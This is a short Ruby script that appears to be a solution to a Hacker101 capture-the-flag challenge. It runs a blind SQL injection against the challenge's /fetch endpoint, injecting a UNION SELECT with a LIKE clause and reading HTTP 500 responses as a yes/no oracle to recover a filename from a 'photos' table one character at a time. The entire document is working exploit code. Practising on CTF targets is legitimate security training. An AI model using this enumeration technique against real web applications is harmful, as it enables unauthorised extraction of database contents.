require 'httparty'

def check?(str)
	resp = HTTParty.get("https://7beab327ff2585388fc070b9756c6889.ctf.hacker101.com/fetch?id=-1 UNION SELECT filename FROM photos WHERE filename LIKE '#{str}%' AND id=3")
	puts resp.code.to_s
	if resp.code == 500
	  return true
	else
	  return false
	end
end

CHARSET = ('A'..'Z').to_a + ('a'..'z').to_a + ('0'..'9').to_a
payload = ''

loop do
  CHARSET.each do |c|
    puts "Trying: #{c} for #{payload}"
    test = payload + c
    next unless check?(test.to_s)

    payload += c
    puts payload
    break
  end
end 
